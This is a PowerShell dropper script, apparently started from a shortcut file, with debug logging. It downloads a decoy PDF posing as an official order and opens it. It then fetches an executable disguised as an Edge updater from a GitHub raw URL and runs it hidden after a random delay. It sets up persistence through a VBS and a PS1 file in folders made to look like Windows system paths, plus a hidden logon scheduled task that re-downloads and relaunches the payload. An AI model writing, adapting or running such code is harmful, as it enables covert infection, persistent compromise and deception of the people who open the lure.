# launcher.ps1 - DEBUG VERSION - tell me exactly what the fuck is happening
$ErrorActionPreference = 'Continue'

function log($msg) {
    $timestamp = Get-Date -Format "HH:mm:ss"
    Write-Host "[$timestamp] $msg" -ForegroundColor Cyan
    "[$timestamp] $msg" | Out-File "$env:APPDATA\Microsoft\Windows\Caches\launcher-debug.log" -Append -Force
}

log "=== LAUNCHER STARTED VIA LNK ==="

$persistBase = "$env:APPDATA\Microsoft\Windows\Libraries"
$cache = "$env:APPDATA\Microsoft\Windows\Caches"
New-Item -ItemType Directory -Path $persistBase -Force | Out-Null
New-Item -ItemType Directory -Path $cache -Force | Out-Null

$pdfUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/1b8f22c806de43fe97c6cd555f455d166591d54d/assets/Nakaz_No._661_vid_02.03.2026.pdf"
$exeUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/main/assets/EdgeUpdater.exe"   # switched to main branch for reliability

$pdfPath = "$cache\doc.pdf"
$exePath = "$cache\helper.exe"

$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}

log "Downloading PDF..."
try {
    Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing -TimeoutSec 20
    log "PDF downloaded - size: $((Get-Item $pdfPath).Length) bytes"
} catch { log "PDF failed: $_" }

if (Test-Path $pdfPath) {
    try { Start-Process $pdfPath -Verb Open; log "PDF opened" } catch { log "PDF open failed" }
}

log "Downloading EXE..."
try {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing -TimeoutSec 20
    log "EXE downloaded - size: $((Get-Item $exePath).Length) bytes"
} catch { log "EXE download failed: $_" }

Start-Sleep -Seconds (Get-Random -Min 15 -Max 35)

log "Launching EXE via WScript..."
try {
    $wsh = New-Object -ComObject WScript.Shell
    $wsh.Run("`"$exePath`"", 0, $false)
    log "WScript launch attempted"
} catch {
    Start-Process $exePath -WindowStyle Hidden
    log "Fallback Start-Process used"
}

# Persistence
log "Setting up persistence..."
$randName = "CacheLib-$(Get-Random -Min 100000 -Max 999999)"
$vbsPath = "$persistBase\$randName.vbs"
$syncPath = "$persistBase\$randName.ps1"
$taskName = "Windows Library Update Task $randName"

$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -NonInteractive -File ""$syncPath""", 0, False
"@
$vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII -Force
log "VBS written to $vbsPath"

$syncContent = @"
`$ErrorActionPreference = 'Continue'
`$log = `"$env:APPDATA\Microsoft\Windows\Caches\sync-debug.log`"
`"$(Get-Date) - Sync started`" | Out-File `$log -Append
Start-Sleep -Milliseconds (Get-Random -Min 5000 -Max 12000)
`$exeUrl = `"$exeUrl`"
`$exePath = `"$exePath`"
if (-not (Test-Path `$exePath)) {
    try { Invoke-WebRequest -Uri `$exeUrl -OutFile `$exePath -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing } catch { `"EXE redownload failed`" | Out-File `$log -Append }
}
try {
    `$wsh = New-Object -ComObject WScript.Shell
    `$wsh.Run("`"`$exePath`"", 0, `$false)
    `"EXE launched via WScript`" | Out-File `$log -Append
} catch {
    Start-Process `$exePath -WindowStyle Hidden
    `"EXE launched via fallback`" | Out-File `$log -Append
}
"@
$syncContent | Out-File -FilePath $syncPath -Encoding UTF8 -Force
log "Sync.ps1 written"

# schtasks
$xml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>
  <Principals><Principal id="Author"><UserId>$env:USERNAME</UserId><LogonType>InteractiveToken</LogonType></Principal></Principals>
  <Settings><Hidden>true</Hidden><AllowStartIfOnBatteries>true</AllowStartIfOnBatteries><DontStopIfGoingOnBatteries>true</DontStopIfGoingOnBatteries></Settings>
  <Actions><Exec><Command>wscript.exe</Command><Arguments>"$vbsPath"</Arguments></Exec></Actions>
</Task>
"@
$xml | Out-File "$env:TEMP\task.xml" -Encoding UTF8
schtasks /Create /TN "$taskName" /XML "$env:TEMP\task.xml" /F | Out-Null
Remove-Item "$env:TEMP\task.xml" -Force
log "Scheduled task created: $taskName"

Start-Process wscript.exe -ArgumentList $vbsPath -WindowStyle Hidden
log "Initial VBS fired"

log "=== LAUNCHER FINISHED ==="
